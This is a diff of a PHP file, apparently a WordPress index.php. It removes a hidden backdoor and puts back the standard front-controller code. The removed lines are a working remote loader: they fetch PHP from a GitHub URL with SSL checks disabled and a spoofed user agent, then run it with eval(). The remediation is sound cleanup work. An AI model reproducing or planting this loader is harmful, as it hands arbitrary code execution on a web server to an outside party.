@@ -1,39 +1,17 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-ignore_user_abort(true);
-set_time_limit(0);
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
 
-$url = "https://raw.githubusercontent.com/otak-bot/jkw/refs/heads/main/landingpage/anvira.php";
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
 
-$ch = curl_init();
-curl_setopt_array($ch, [
-    CURLOPT_URL => $url,
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_FOLLOWLOCATION => true,
-    CURLOPT_SSL_VERIFYPEER => false,
-    CURLOPT_CONNECTTIMEOUT => 20,
-    CURLOPT_TIMEOUT => 60,
-    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-    CURLOPT_HTTPHEADER => [
-        'Accept: text/plain',
-        'Accept-Encoding: identity'
-    ]
-]);
-
-$content = curl_exec($ch);
-$err = curl_error($ch);
-curl_close($ch);
-
-if ($err) {
-    echo "CURL Error: $err";
-} elseif ($content === false || strlen($content) < 50) {
-    echo "No valid content received from URL";
-} else {
-    try {
-        eval("?>" . $content);
-    } catch (Throwable $t) {
-        echo "Execution Error: " . $t->getMessage();
-    }
-}
-?>
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
